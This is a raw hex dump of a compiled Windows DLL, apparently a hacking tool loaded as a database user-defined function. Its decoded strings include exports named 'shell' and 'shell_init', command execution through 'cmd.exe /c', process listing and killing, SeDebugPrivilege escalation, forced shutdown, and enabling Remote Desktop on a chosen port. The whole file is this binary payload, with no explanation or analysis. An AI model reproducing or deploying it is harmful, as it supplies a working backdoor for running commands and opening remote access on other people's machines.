FC8A08741D80F92F740580F92D753440803800742EFF74240C50FF150C410010EB1B80F92F740580F92D7517408038007411FF74240C50FF15F840001085C059597408473B7E087CADEB0D8B460C8B04B847894614897E108B46145F5EC20400565733FF33F6397C240C7E188B442410FF34B8E8111B0000473B7C2410598D7406017CE85F8BC65EC333C0390510600010740D5050A310600010FF15444100108B0D24600010E89A0E00008B4C240489410C32C0C38B442404FF700C8B0D24600010E875180000C3558BEC518B0D246000108365FC00568B7514568D45FC508B450CFF7008FF308B4508FF700CE80F190000833EFF7516837DFC00740DFF75FCE8841A0000598906EB038326008B45FC8B551885C00F94C1880A5EC9C3837C240801752B8B4424046A2CA320600010E85B1A000085C05974098BC8E879180000EB0233C085C0A324600010752AEB2B837C24080075218B0D2460001085C97417568BF1E8BE17000056E80A1A000083252460001000595E33C040C20C00558BEC83EC1453578D45F8506A08FF750833DB895DF8895DF4FF151C4000108BF83BFB7467568B35144000108D45FC5053536A01FF75F8895DFCFFD6395DFC8BF87648FF75FCE8C7190000598D4DFC51FF75FC8945F4506A01FF75F8FFD68BF83BFB74278D45EC508D45F050FF750C8D451450FF75108B45F4C745F004010000FF3053FF15184000108BF85E395DF87409FF75F8FF15A4400010395DF47409FF75F4E854190000598BC75F5BC9C38B4424048B0868A041001050FF51085959C3558BECB838250000E85B1900006683A5D4FDFFFF006683A5D8FEFFFF005356576A4033C0598DBDD6FDFFFFF3AB66AB6A4033C0598DBDDAFEFFFFF3AB33DB43395D0C66AB8BC3C645FD00C645FA00C645FF00C645FE00C645FB00C645FC008945F40F86B30000008B75108B3DFC400010C1E0028B0C3080392D75710FBE510183EA6B743A4A74314A7562837D0C030F8C900000008A490280F970C645FA01741280F97375478B443004C645FE018945DCEB3AC645FF01EB1DC645FD01EB2E837D0C037C670FBE490283E96E74144949751BC645FB01FF743004FFD7598945ECEB0B8B443004C645FC018945E08B45F4403B450C8945F40F8274FFFFFF807DFD007530807DFF00752A807DFE007524807DFB00751E807DFC007518FF7508E8CCFEFFFFEB4368CC420010EB3268B0420010EB2B53689C420010E81BF9FFFF59598D45E45068001000008D85C8DAFFFF50E8E619000085C0751768804200108B45088B0850FF510859598BC3E9B30200008365F400F745E4FCFFFFFF0F86A00200008D9DC8DAFFFFBE04010000FF338B3D384000106A006810040000FFD785C089450C0F84640200008365E80068001000008D85C8EAFFFF6A0050E89A170000568D85D4FDFFFF6A0050E88B170000568D85D8FEFFFF6A0050E87C170000568D85D0FCFFFF6A0050E86D170000568D85CCFBFFFF6A0050E85E170000568D85D4FDFFFF508D85D8FEFFFF50FF750CE82FFDFFFF83C44C8D45E85068001000008D85C8EAFFFF50FF750CE80819000085C0742C568D85D0FCFFFF50FFB5C8EAFFFFFF750CE8E8180000568D85CCFBFFFF50FFB5C8EAFFFFFF750CE8CC180000807DFB0074078B45EC3903741C807DFC007463FF75E08D85CCFBFFFF50FF15CC40001085C05959754DFF750CFF15A4400010FF336A006A01FFD785C08B7D0889450C74358B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C4186A00FF750CFF15A8400010EB038B7D08807DFD0074258B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C418807DFF0074148B45EC3B03750D8B07685442001057FF50085959807DFA000F84DE0000008365F000F745E8FCFFFFFF0F86CD000000807DFF0074568B45EC3B030F85BC000000568D85C8FAFFFF6A0050E8031600008B7DF083C40C568D85C8FAFFFF508DBCBDC8EAFFFFFF37FF750CE8BA170000FF378B45088B088D95C8FAFFFF52684442001050FF51088B7D0883C410807DFE007459568D85CCFBFFFF508B45F0FFB485C8EAFFFFFF750CE87717000085C0743BFF75DC8D85CCFBFFFF50FF15EC40001085C0595974258B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C4188B45E8FF45F0C1E8023945F00F8233FFFFFFFF750CFF15A44000108B45E4FF45F4C1E80283C3043945F40F826BFDFFFF33C05F5E5BC9C3558BEC51568D45FC50681900020033F656FF750CFF7508FF150840001085C075278D451850FF75145656FF7510FF75FCFF150C40001085C07403897518FF75FCFF1510400010EB038975188B45185EC9C3558BEC5151538B5D10578D45FC50FF750C33FF397D20FF7508897DF87508FF1528400010EB2FFF152C40001085C0757957578D4514505753FF75FCFF150C40001085C07564837D2002750E53FF75FCFF150040001085C07550837D1401568B35044000107406837D1402751CFF7518E860140000594050FF7518FF75145753FF75FCFFD685C07520837D140475136A048D451C506A045753FF75FCFFD685C07507C745F8010000005EFF75FCFF15104000108B45F85F5BC9C3558BEC51576810430010FF15404000108BF885FF744A53568B353C40001068FC42001057FFD68BD885DB743268E842001057FFD68BF085F674248D45FC506A016A016A13FFD63D7C0000C0750C8D45FC506A006A016A13FFD6FF7508FFD35E5B5FC9C3566A016870430010E8B7F4FFFF8B7424108B06685843001056FF50088B44241C33C983C4103BC175135151FF152C41001085C075566844430010EB3083F8017514516A06FF152C41001085C0753D6830430010EB1783F802751B516A0CFF152C41001085C07524681C4300108B0656FF500859EB1583F80375046A01EB0783F80475086A02E813FFFFFF5933C0405EC3558BEC837D0C027C288B45108B400480382D751D4050FF15FC40001085C0597C1083F8047F0B50FF7508E841FFFFFFEB0E8B45088B08688843001050FF5108595933C05DC3A13060001085C0752168504400106844440010FF154040001050FF153C40001085C0A3306000107501C36A01FF74240C6A00FFD00FB6C0C3A12860001085C07521686C4400106860440010FF154040001050FF153C40001085C0A3286000107501C36A01FF742408FFD0C3558BEC83EC6456578D45E8508D45E4506A0133FF5757E85D1400003BC78945DC751F8B75088B3EFF15A040001050681045001056FF570883C40C33C0E929010000538B5D088B0368B844001053FF5008397DE88B75E45959897DF00F86FD0000008D45EC508D45FC506A0E897DFC897DF8897DF4FF3657E8F61300008D45EC508D45F8506A0AFF3657E8E41300008D45EC508D45F4506A05FF3657E8D2130000FF7608E825FFFFFF5957576A208D4D9C51508945E0FF15E4400010598D44000250FF75E05757FF15444000108B45FC83380275280FB64809510FB64808510FB648070FB6400651508D45BC68AC44001050FF150441001083C418EB118D45BC68A444001050FF150441001059598B038D4D9C518D4DBC51FF75F8FF75F4FF7604FF36687C44001053FF500883C420FF75FCE836130000FF75F8E82E130000FF75F4E82613000057E82013000083C60CFF45F08B45F03B45E80F8203FFFFFFFF75E4E8061300008B45DC5B5F5EC9C3560FB774240C85F674426A00566A006A0468E045001068984500106802000080E811FCFFFF83C41C85C08B4424088B08740F56686445001050FF510883C40C5EC3683C45001050FF510859595EC3558BEC83EC0C8365F8008365FC0056576A048D45FC50BF9C460010576870460010BE0200008056C745F401000000E864FBFFFF83C41485C07449837DFC0275436A048D45FC5057684046001056E845FBFFFF83C41485C0742A837DFC0275246A048D45F8506834460010BF004600105756E821FBFFFF83C41485C07406837DF800750432C0EB246A048D45F45068EC4500105756E8FEFAFFFF83C41485C07504B001EB07837DF4000F94C05F5EC9C3E84CFFFFFF84C0B9D04600107505B9C44600108B4424048B105168A446001050FF520883C40CC3558BEC83EC108D45FC5068190002006A0068984500106802000080C745F83D0D0000C745F004000000C745F450000000FF150840001085C075488D45F4508D45F8508D45F0506A0068E0450010FF75FCFF150C40001085C0751FFF75F88B45088B0868F046001050FF510883C40CFF75FCFF1510400010C9C3FF75FCFF15104000108B45088B0868D846001050FF51085959C9C3FF742404E83CFFFFFF59E95DFFFFFF515355565733DB536A02536A04BF9C460010576870460010BE0200008056E84CFAFFFF536A02536A0457684046001056E83AFAFFFF8944244833C0385C24546A010F94C0BF0046001050536A0468EC4500105756E816FAFFFF8BE883C4543BEB7406385C241C742133C0385C241C530F95C050536A0468344600105756E8EDF9FFFF83C41C3BC375043BEB7420395C2410741A385C241C8B4424188B0874076850470010EB126830470010EB0B8B4424188B08680C47001050FF510859595F5E5D5B59C3B802310010E8D10E000083EC18837D0C027D158B45088B0868A047001050FF51085959E9EE00000053565733F656FF75108D4DDCFF750CE8ECF1FFFF68984700108D4DDC8975FCE890F2FFFF8B5D0833FF4785C07415FF75F08BF7FF15FC4000105053E80DFDFFFF83C40C68904700108D4DDCE8FBF1FFFF84C0740357EB1368884700108D4DDCE8E7F1FFFF84C0740C6A00538BF7E8A2FEFFFF595968804700108D4DDCE8CAF1FFFF84C07409538BF7E878FEFFFF5968784700108D4DDCE8B0F1FFFF84C07409538BF7E838FBFFFF5968704700108D4DDCE8FFF1FFFF85C07415FF75F08BF7FF15FC4000105053E8A9FAFFFF83C40C85F6750D8B0368A047001053FF50085959834DFCFF8D4DDCE83CF1FFFF5F5E5B8B4DF433C064890D00000000C9C3568B7424108326006A106890490010FF742414E8BF0D000083C40C85C075108B44240889068B0850FF510433C0EB05B8024000805EC20C008B44240483C00450FF1548400010C20400568B742408578D460450FF154C4000108BF885FF750D85F674098B066A018BCEFF500C8BC75F5EC20400F644240401568BF1C70680490010740756E8C10C0000598BC65EC20400568BF18B861C0100005733FF3BC7740D50FF155840001089BE1C0100008B86180100003BC7740D50FF15A440001089BE180100005757576A0457FF760CFF15544000103BC7898618010000750433C0EB15575757681F000F0050FF155040001089861C0100005F5EC383B91C0100000074128B490C83F9FF740A6A0051FF155C400010C333C0C351FF1548400010C38B4424048B1534600010EB028BC18B48083BCA75F7C38B4424048B1534600010EB028BC18B083BCA75F8C38B5424048B02568B700889328B70083B353460001074038956048B72048970048B49043B51045E7505894104EB0F8B4A043B51087505894108EB028901895008894204C20400568BF18B0E83791400750D8B410439480475058B4108EB1E8B013B0534600010740D50E867FFFFFF59EB0B89068BC88B41043B0874F589065EC3568BF18B0E8B41083B0534600010740D50E855FFFFFF59EB1389068BC88B41043B480874F48B0E394108740289065EC38B44240485C0740E8B4C24088B1189108B4904894804C353568BF133DB895E04C74608A049001068C849001053C706B8490010C74608AC490010FF15D8400010834E0CFF5959885E10899E18010000899E1C010000C78614010000010000008BC65E5BC3558BECB800200000E80C0B00008D451050FF750C8D8500E0FFFF50FF15D44000108B4D088B1183C40C508D8500E0FFFF50FF5204C9C3568BF1E814000000F644240801740756E8A10A0000598BC65EC20400568BF18B861C01000085C0C706B8490010C74608AC490010740750FF15584000108B861801000085C0578B3DA4400010740350FFD78B460C83F8FF740350FFD783BE14010000005F740F8D4610803800740750FF15AC400010C706804900105EC3566820010000E8450A000085C059740B8BC8E8E9FEFFFF8BF0EB0233F685F674068B0656FF50048BC65EC3558BEC518365FC00837D0CFF568BF1750CFF7508E8060A00005989450C837E04FF75106A016A008D4EF8E82100000085C074186A008D45FC50FF750CFF7508FF7604FF15984000108B45FC5EC9C20800558BEC81EC04010000568BF1578DBE1C0100008B0785C0740A50FF15584000108327008DBE180100008B0785C0538B1DA4400010740650FFD38327008B460C83F8FF740750FFD3834E0CFF83BE1401000000740F8D4610803800740750FF15AC400010837D08007412FF75088D7E1057E8E2090000595933DBEB278D85FCFEFFFF506804010000FF156C4000108D7E105733DB53538D85FCFEFFFF50FF156840001053536A02535368000000C057FF156440001083F8FF89460C5B7507C6070033C0EB0C8B450C89861401000033C0405F5EC9C208008B5424048B4208568B308972088B303B353460001074038956048B72048970048B49043B51045E7505894104EB0E8B4A043B1175048901EB038941088910894204C204008B41048B48048B15346000103BCA741A568B7424088B3639710C7D058B4908EB048BC18B093BCA75EE5EC204005356578B7C24103B3D346000108BD98BF7741DFF76088BCBE8E3FFFFFF8B3657E8520800003B3534600010598BFE75E35F5E5BC20400558BEC83EC105356894DF8578B7D0C8D4D0CE8AAFCFFFF8B37A1346000103BF08D5F08897DFC895DF475048B33EB188B0B3BC8741251E8F1FBFFFF8945FC83C0088B30598945F48D4DF0FF15B84000108B45FC3BC774608B0F8941048B0F89083B037505894604EB178B48048B55F4894E048B480489318B0B890A8B0B8941048B5DF88B4B043979047505894104EB0E8B4F04393975048901EB038941088B4F048948048B48148B5714895014894F14897DFC8BC7EB7B8B48048B55F8894E048B4A043979047505897104EB0E8B4F04393975048931EB038971088B4A043939894DF475238B1B3B1D3460001075078B5F048919EB1256E830FBFFFF8B55F8598B4DF489018B45FC8B5A04397B08751F8B0F3B0D3460001075088B4F04894B08EB0D56E8EEFAFFFF8943088B45FC598B5DF833FF473978140F850B010000E9B9000000397E140F85FA0000008B4E048B013BF075728B410883781400751A8978148B460483601400FF76048BCBE8E7FDFFFF8B46048B40088B0839791475088B4808397914746E8B480839791475178B0889791483601400508BCBE8A1FAFFFF8B46048B40088B4E048B49148948148B4E048979148B4008897814FF76048BCBE894FDFFFFEB7F8378140075198978148B460483601400FF76048BCBE860FAFFFF8B46048B008B4808397914751C8B083979147515836014008B76048B43043B70040F853BFFFFFFEB3C8B0839791475178B480889791483601400508BCBE836FDFFFF8B46048B008B4E048B49148948148B4E048979148B00897814FF76048BCBE8FBF9FFFF897E148D4DF0FF15BC400010FF75FCE8E7050000FF4B0C8B4508598B4D0C5F5E89085BC9C20800558BEC51568BF1837E0C008B4D0C74388B46043B087531394510752CFF70048BCEE837FDFFFF8B0D346000108B46048948048B460483660C0089008B46048940088B46048B08EB253B4D107420578BF98D4D0CE8FCF9FFFF578D45FC508BCEE82FFDFFFF8B4D0C3B4D1075E25F8B450889085EC9C20C00558BEC5156578B7D0C578BF1E8A8FCFFFF8B76043BC689450C740C8B0F3B480C7C058D450CEB068975FC8D45FC8B088B45085F89085EC9C20800558BEC51515356576A188BF9E8290500008BF05933DB8D4DF8895E04C74614010000008975FCFF15B8400010391D346000107513893534600010891EA134600010895DFC895808FF05386000108D4DF8FF15BC400010395DFC7409FF75FCE8C0040000598B35346000106A18E8C9040000897004895814894704895F0C5989008B47045F5E8940085BC9C3558BEC5356576A188BD9E8A00400008B7510FF75148BF883671400897704A1346000108907A1346000108947088D470C50E812F9FFFF83C40CFF430C3B730474258B450C3B0534600010751A8B45148B003B460C7C10897E088B43043B7008751C897808EB17893E8B43043BF075088978048B4304EBEA3B30750289388B43043B78048BF70F84B00000008B4604837814000F85A30000008B50048B0A3BC175598B4A0883791400751E8B560433C0408942148941148B46048B4004836014008B46048B7004EB673B7008750A8BF0568BCBE8D9FAFFFF8B4604C74014010000008B46048B4004836014008B4604FF70048BCBE8A0F7FFFFEB358379140074AA3B30750A8BF0568BCBE88AF7FFFF8B4604C74014010000008B46048B4004836014008B4604FF70048BCBE881FAFFFF8B43043B70040F8550FFFFFF8B43048B4004C74014010000008B450889385F5E5B5DC21000558BEC51568BF18B46048B0850518D45FC508BCEE857FDFFFFFF7604E8230300008366040083660C00598D4DFC33F6FF15B8400010FF0D38600010750D8B3534600010832534600010008D4DFCFF15BC40001085F6740756E8E7020000595EC9C3558BEC515356578BF98B47048B70048BD8A1346000103BF0B201741C8B4D0C8B093B4E0C8BDE0F9CC284D274048B36EB038B76083BF075E9807F08007405FF750CEB2684D28BCB894DFC74128B47043B1874EB8D4DFCE8CEF6FFFF8B4DFC8B510C8B450C3B107D195053568D450C508BCFE8D5FDFFFF8B088B4508C6400401EB078B4508C64004005F5E89085BC9C20800568BF18D461450FF15704000108D4E045EE9F8FEFFFF558BEC515153568BF18D461457508945F8FF15784000108D4508508D45FC8D5E04508BCBE8B6FCFFFF8B7DFC3B7E0874198B471085C074068B0850FF5108578D4508508BCBE8B1F9FFFFFF75F8FF15744000105F5E5BC9C20400558BEC5151FF750C8D45F850E8EEFEFFFF8B45088B4DF889088A4DFC884804C9C20800568BF18D4E04C6410800E88DFCFFFF8326008D461450FF157C4000108BC65EC3558BEC83EC108B45088B008365FC008945F88D45F8508D45F050E89EFFFFFF8B0083C010C9C20400558BEC518B4518568B75148326008308FF837D0C00894DFC750CA1146000108906E94A010000538B1DCC400010578B7D1068784A0010FF37FFD385C059590F842301000068744A0010FF37FFD385C059590F8410010000E8E2F6FFFF8BF085F6750E8B4514C700644A0010E9FE00000068604A0010FF37FFD385C0595975158D46085057FF750CE809E4FFFF83C40CE99700000068584A0010FF37FFD385C05959750F8D46085057FF750CE84AE4FFFFEBDA684C4A0010FF37FFD385C05959750F57FF750C8D460850E892EDFFFFEBBC68484A0010FF37FFD385C05959750F57FF750C8D460850E850E7FFFFEB9E68404A0010FF37FFD385C05959750F57FF750C8D460850E8FFF1FFFFEB808D7E088B0768284A001057FF50088B0759596AFFFF35146000108BCFFF50048BCEE88BF3FFFF8B4D1489018BCEE8E8F3FFFF8B5DFC8B4D188D7B14578901FF15784000108D4508508D4B04E87CFEFFFF578930FF1574400010EB07A11460001089065F5B33C05EC9C21400FF742404E80200000059C3FF2500410010FF25F4400010FF25F0400010FF25E8400010CCCCCCCCCCCCCCCCCCCC513D001000008D4C2408721481E9001000002D0010000085013D0010000073EC2BC88BC485018BE18B088B400450C3CCFF25C4400010CCCCCCCCCCCCCCCCCCCC6AFF5064A100000000508B44240C64892500000000896C240C8D6C240C50C3CCFF25E0400010FF25DC400010FF25D04000108B44240885C0750E39053C6000107E2EFF0D3C6000108B0D1041001083F8018B09890D40600010753F6880000000FF150841001085C059A348600010750433C0EB66832000A14860001068046000106800600010A344600010E8EA000000FF053C6000105959EB3D85C07539A14860001085C074308B0D44600010568D71FC3BF072128B0E85C97407FFD1A14860001083EE04EBEA50FF150041001083254860001000595E6A0158C20C00558BEC538B5D08568B750C578B7D1085F67509833D3C60001000EB2683FE01740583FE027522A14C60001085C07409575653FFD085C0740C575653E815FFFFFF85C0750433C0EB4E575653E80BE4FFFF83FE0189450C750C85C07537575053E8F1FEFFFF85F6740583FE037526575653E8E0FEFFFF85C0750321450C837D0C007411A14C60001085C07408575653FFD089450C8B450C5F5E5B5DC20C00FF25C8400010FF2524410010FF2518410010FF251C410010FF2520410010FF2538410010FF253C410010FF25344100108D4DDCE9C2E1FFFFB8884A0010E934FEFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000BE4F0000AC4F00009C4F0000884F00007A4F0000644F0000504F00003C4F0000244F00000C4F0000DE4F0000D04F000000000000724D0000824D0000904D0000A24D0000B24D0000C84D0000E04D0000F84D0000084E00001E4E0000304E00005E4D00004C4E00005A4E00006E4E00007E4E0000964E0000AE4E0000C64E0000504D00003E4D00002C4D00001C4D0000104D0000FA4C0000EE4C0000E64C0000D64C0000C84C0000B44C00003E4E0000A44C000000000000325000001850000000000000D65000003A51000022510000185100000C51000000510000F4500000EA500000CC500000C2500000B8500000A85000009E50000092500000645000006C500000745000007E5000008850000046510000000000006C510000845100009A5100005651000000000000F04E000000000000E2510000B4510000C451000000000000FC4F00000000000000000000636D642E657865202F6320257300000055736167653A636D6420226E65742075736572220D0A0D0A0000000055736167653A6578656320226E65742075736572220D0A0D0A000000CB120010000000000D0A7073202D6C0920C1D0B3F6CBF9D3D0BDF8B3CC0D0A7073202D6D73206E616D650920C1D0B3F6BCD3D4D8C1CBD6B8B6A8C4A3BFE9C3FBB5C4BDF8B3CC0D0A7073202D6D70207069640920C1D0B3F6D6B8B6A8BDF8B3CCB5C4CBF9D3D0C4A3BFE90D0A7073202D6B70207069640920B9D8B1D5D2BBB8F6BDF8B3CC0D0A7073202D6B6E206E616D650920B9D8B1D5CBF9D3D0D6B8B6A8B5C4BDF8B3CCC3FB0D0A0000002573093C3078252E38583E0D0A0000004D6F64756C65506174680942617365416464726573730D0A0000000025640925735C25730925730D0A000000456E756D50726F6365737365732829206572726F722E0D0A000000005365446562756750726976696C656765000000007073202D6B6E206E616D650D0A7073202D6B70207069640D0A0000007073202D6D73206E616D650D0A7073202D6D70207069640D0A00000052746C41646A75737450726976696C65676500005A7753687574646F776E53797374656D000000004E54444C4C2E444C4C0000004661696C656420546F2053687574646F776E00004661696C656420546F205265626F6F74000000004661696C656420546F204C6F676F66660000000049732054616B696E6720506C6163652E2E2E2E2E2E0D0A00536553687574646F776E50726976696C656765000000000055534147453A0D0A20202020202073687574646F776E205B202D30313233345D0D0A2020202020202D30202020206C6F676F66662E0D0A2020202020202D31202020207265626F6F742E0D0A2020202020202D3220202020706F7765726F66662E0D0A2020202020202D33202020207375706572207265626F6F742E0D0A2020202020202D342020202073757065722073687574646F776E2E0D0A6578616D706C653A0D0A20202020202073687574646F776E202D330D0A0000000077696E7374612E646C6C000057696E53746174696F6E5265736574005554494C444C4C2E646C6C00537472436F6E6E656374537461746500252D3131642020252D3133732020252D3133732020252D3133732020252D313573202025730D0A00202020200000000025642E25642E25642E25640053657373696F6E49442020202053657373696F6E4E616D6520202020557365724E616D6520202020202020436C69656E744E616D6520202020202020495020202020202020202020202020202053746174650D0A00000000456E756D6572617465205465726D696E616C2053657373696F6E73204661696C65642E2025640D0A000000004661696C20546F20536574204E6577205465726D696E616C205365727669636520506F72740D0A00546865205465726D696E616C205365727669636520506F727420486173204265656E2053657420546F2025640D0A00000000000053595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C205365727665725C57696E53746174696F6E735C5244502D54637000000000506F72744E756D62657200006644656E795453436F6E6E656374696F6E73000053595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C20536572766572000000005453456E61626C656400000053595354454D5C43757272656E74436F6E74726F6C5365745C53657276696365735C5465726D5365727669636500000053595354454D5C43757272656E74436F6E74726F6C5365745C53657276696365735C5465726D44440000000053746172740000005465726D696E616C2053657276696365205374617475733A2025730D0A00000044697361626C656400000000456E61626C6564005265674F70656E4B65794578204572726F722E0D0A0000005465726D696E616C205365727669636520506F72743A2025640D0A00536574204E6577205465726D696E616C2053657276696365204661696C65640D0A000000536574205465726D696E616C20536572766963652044697361626C65640D0A00536574205465726D696E616C205365727669636520456E61626C65642E0D0A006C6F676F666600007175657279000000766965770000000064697361626C6500656E61626C65000070000000000000004445534352495054494F4E3A0D0A202020202020202020202020436F6E666967205465726D696E616C205365727669636520537570706F72747320323030302F78702F323030332E0D0A55534147453A0D0A2020202020207465726D737663202D656E61626C65202D64697361626C65202D76696577202D70203C6E6577706F72743E202D7175657279202D6C6F676F6666203C73657373696F6E2069643E0D0A2020202020202D656E61626C6520202020456E61626C65205465726D696E616C20536572766963652E0D0A2020202020202D64697361626C6520202044697361626C65205465726D696E616C20536572766963652E0D0A2020202020202D7669657720202020202056696577205465726D696E616C20536572766963652053657474696E67732E0D0A2020202020202D70202020202020202020536574204E6577205465726D696E616C205365727669636520506F72742E0D0A6578616D706C653A0D0A2020202020207465726D737663202D71756572790D0A2020202020207465726D737663202D6C6F676F666620310D0A2020202020207465726D737663202D656E61626C65202D7020333339390D0A2020202020207465726D737663202D7020333339390D0A2020202020207465726D737663202D766965770D0A0099210010D1210010E22100100C2200100000000000000000C000000000000046762F0010762F0010762F0010F7230010D5240010F723001099210010D1210010E22100102D2400102E4F4350000000000D0A68656C700D0A436D6420202020202020202D3E0D0A45786563202020202020202D3E0D0A53687574646F776E2020203D3E0D0A70732020202020202020203D3E0D0A5465726D537663202020203D3E0D0A0D0A000000556E6B6E6F776E20436F6D6D616E642E3A28200D0A0D0A005465726D537663007073000073687574646F776E000000004578656300000000436D6400455F4F55544F464D454D4F52590000003F00000068656C7000000000FFFFFFFFFA3000102005931901000000804A0010000000000000000000000000000000008C4B00000000000000000000E24E000034400000844C00000000000000000000004F00002C410000584B00000000000000000000EE4F0000004000009C4C000000000000000000000E50000044410000104C000000000000000000004C500000B84000001C4C000000000000000000002E510000C4400000704C00000000000000000000AA510000184100008C4C00000000000000000000FA510000344100000000000000000000000000000000000000000000BE4F0000AC4F00009C4F0000884F00007A4F0000644F0000504F00003C4F0000244F00000C4F0000DE4F0000D04F000000000000724D0000824D0000904D0000A24D0000B24D0000C84D0000E04D0000F84D0000084E00001E4E0000304E00005E4D00004C4E00005A4E00006E4E00007E4E0000964E0000AE4E0000C64E0000504D00003E4D00002C4D00001C4D0000104D0000FA4C0000EE4C0000E64C0000D64C0000C84C0000B44C00003E4E0000A44C000000000000325000001850000000000000D65000003A51000022510000185100000C51000000510000F4500000EA500000CC500000C2500000B8500000A85000009E50000092500000645000006C500000745000007E5000008850000046510000000000006C510000845100009A5100005651000000000000F04E000000000000E2510000B4510000C451000000000000FC4F00000000000071025365744C6173744572726F7200009E025465726D696E61746550726F6365737300001B00436C6F736548616E646C65001A014765744C6173744572726F7200009602536C65657000DF02577269746546696C6500CE0257616974466F7253696E676C654F626A6563740018025265616446696C650000F9015065656B4E616D65645069706500440043726561746550726F63657373410000500147657453746172747570496E666F41004300437265617465506970650000F70047657443757272656E7450726F63657373006D014765745469636B436F756E740000EF014F70656E50726F63657373003E0147657450726F63416464726573730000C2014C6F61644C696272617279410000D2025769646543686172546F4D756C74694279746500B001496E7465726C6F636B6564496E6372656D656E740000AD01496E7465726C6F636B656444656372656D656E740000D6014D6170566965774F6646696C6500350043726561746546696C654D617070696E67410000B002556E6D6170566965774F6646696C6500120147657446696C6553697A6500570044656C65746546696C654100340043726561746546696C654100630147657454656D7046696C654E616D65410000650147657454656D7050617468410000550044656C657465437269746963616C53656374696F6E00C1014C65617665437269746963616C53656374696F6E00006600456E746572437269746963616C53656374696F6E0000AA01496E697469616C697A65437269746963616C53656374696F6E004B45524E454C33322E646C6C0000D3004578697457696E646F77734578005553455233322E646C6C0000170041646A757374546F6B656E50726976696C6567657300F5004C6F6F6B757050726976696C65676556616C7565410042014F70656E50726F63657373546F6B656E0000EF004C6F6F6B75704163636F756E745369644100D000476574546F6B656E496E666F726D6174696F6E005B01526567436C6F73654B6579007B01526567517565727956616C7565457841000072015265674F70656E4B657945784100860152656753657456616C75654578410000640152656744656C65746556616C7565410071015265674F70656E4B657941005E015265674372656174654B6579410041445641504933322E646C6C00002E00436F496E697469616C697A65457800006F6C6533322E646C6C000B013F3F315F4C6F636B697440737464404051414540585A0000A2003F3F305F4C6F636B697440737464404051414540585A00004D5356435036302E646C6C005753325F33322E646C6C00003D0261746F6900005E02667265650000B202737072696E74660091026D616C6C6F63000059015F6D6273636D70005F015F6D627369636D700000BE027374726C656E00000F003F3F3240594150415849405A0000C502737472737472000099026D656D7365740000E6027763736C656E000049005F5F4378784672616D6548616E646C65720096026D656D636D70000092015F7075726563616C6C00AD027365746C6F63616C6500DC0276737072696E74660000BA027374726370790000C1015F73747269636D7000004D53564352542E646C6C00000F015F696E69747465726D009D005F61646A7573745F6664697600000C004765744D6F64756C65426173654E616D654100000E004765744D6F64756C6546696C654E616D6545784100000400456E756D50726F636573734D6F64756C657300000500456E756D50726F6365737365730050534150492E444C4C000800575453467265654D656D6F7279000C00575453517565727953657373696F6E496E666F726D6174696F6E41000600575453456E756D657261746553657373696F6E73410057545341504933322E646C6C000057494E494E45542E646C6C0000000000000000000000000000000000BFC7514B00000000665200000100000003000000030000004852000054520000605200003314000020140000F4130000725200007852000085520000000001000200546573745544462E646C6C007368656C6C007368656C6C5F6465696E6974007368656C6C5F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000D0490010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000140100000F30163039304E305D307330C430F630043110313F3166317C319C31A531BD31F6310F3231323B3242325A327432B332C632D532193336338733A433F833013407340D34293439349634B234C334DB34033510356D357E359D351436CD36D436DC360137373723383238623874389D38B8382B3969398D39AF39E839013A113A403A483A5D3A713A803ACE3ADF3AE53AF33AF83A063B403B503B693B723B823B8B3B9B3BA43BE43B033C123C1B3C203C263C2D3C343C4A3C533C583C5E3C653C6C3CA53CAB3CC43C333D443D683D6F3D7C3D833D9F3DFC3D013E1E3E2C3E4F3E553E803E9E3EA33EC63EEF3EF63E023F203F403F573F603F713F813F8C3F963FBF3FC53FDC3FF63FFF3F000000200000F0000000283051305830653076308E30B230D230E130F53012312C3146315D317231A431DB31EE3116323C32533268328532A832B332BE32D432F43245336D33B633BB33C233C933CF33143456345D34663475349E34A4341935413555358435AE35C335D5350C36473675369336BC36EE368B37B637F0383739E839EE39F639FD39093A123A263A6A3A713A913AD03BD63BDE3BE43BEE3B123C9A3CBA3CF63C3C3D873D953D9E3DB13DD33DDD3D013E1F3E3D3E5B3E7E3E8E3EB83ECD3ED43EF03EF63EFC3E023F423F723F783F7E3F8C3F943F9A3FA53FB23FBA3FC83FCD3FD23FD73FE23FEF3FF93F000000300000280000000E301A30203042305430B030CC30D230D830DE30E430EA30F030F63003310000004000002C00000098318039843988398C39A039A439A839AC39B039B439B839BC39C039C439843A903A0000006000000C0000001430000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000